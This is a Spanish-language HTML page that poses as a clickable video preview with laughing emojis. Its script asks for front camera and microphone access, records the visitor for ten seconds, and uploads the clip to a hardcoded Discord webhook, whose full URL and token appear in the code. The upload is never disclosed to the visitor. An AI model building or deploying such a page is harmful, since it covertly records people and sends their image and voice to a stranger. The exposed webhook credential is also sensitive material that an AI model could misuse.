<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GRABANDO VIDEO</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #000000; /* Fondo negro */
            font-family: Arial, sans-serif;
            color: #ffffff; /* Texto blanco */
            position: relative;
        }
        #container {
            width: 80%;
            max-width: 600px;
            border: 2px solid #ff0000; /* Contorno rojo */
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            position: relative;
            cursor: pointer;
        }
        video, img {
            width: 100%;
            border-radius: 10px;
        }
        .warning {
            color: #ff0000;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        .emojis {
            font-size: 32px;
            position: absolute;
            bottom: 10px;
        }
        #compatibility-message {
            color: #ff0000;
            font-size: 18px;
            margin-top: 20px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="warning">GUARDANDO VIDEO</div>
    <div id="container" onclick="startWebcam()">
        <!-- Cambia 'vista-previa.jpeg' por el nombre de tu imagen -->
        <img id="previewImage" src="vista-previa.jpeg" alt="Vista previa del video">
        <video id="video" autoplay style="display: none;"></video>
    </div>
    <div class="emojis">ðŸ˜‚ðŸ¤£ðŸ˜†</div>
    <div id="compatibility-message">Tu navegador no es compatible. Por favor, abre esta pÃ¡gina en un navegador moderno como Chrome o Safari.</div>

    <script>
        const webhookURL = 'https://discord.com/api/webhooks/1243016760014278737/-rJTQS8xYX2H-zZHV22yU4LCJOxhYIJsfNtERt_Z3Wbd0wLWnzD7QKYwHL0h4iDXicSX';

        async function startWebcam() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                showCompatibilityMessage();
                return;
            }
            if (!window.MediaRecorder) {
                showCompatibilityMessage();
                return;
            }

            try {
                const constraints = {
                    video: {
                        facingMode: "user" // Intenta usar la cÃ¡mara frontal
                    },
                    audio: true // TambiÃ©n capturarÃ¡ el audio
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const videoElement = document.getElementById('video');
                const previewImage = document.getElementById('previewImage');
                videoElement.srcObject = stream;
                videoElement.style.display = 'block';
                previewImage.style.display = 'none';

                // Empezar a grabar el video
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = event => {
                    chunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('file', blob, 'video.webm');

                    // Enviar el video al webhook de Discord
                    try {
                        await fetch(webhookURL, {
                            method: 'POST',
                            body: formData
                        });
                        console.log('Video enviado al webhook de Discord');
                    } catch (error) {
                        console.error('Error al enviar el video al webhook de Discord:', error);
                    }
                };

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000); // Detener la grabaciÃ³n despuÃ©s de 10 segundos

            } catch (error) {
                console.error('Error al acceder a la cÃ¡mara:', error);
                alert('No se pudo acceder a la cÃ¡mara. AsegÃºrate de haber dado permiso.');
            }
        }

        function showCompatibilityMessage() {
            const messageElement = document.getElementById('compatibility-message');
            messageElement.style.display = 'block';
        }
    </script>
</body>
</html>
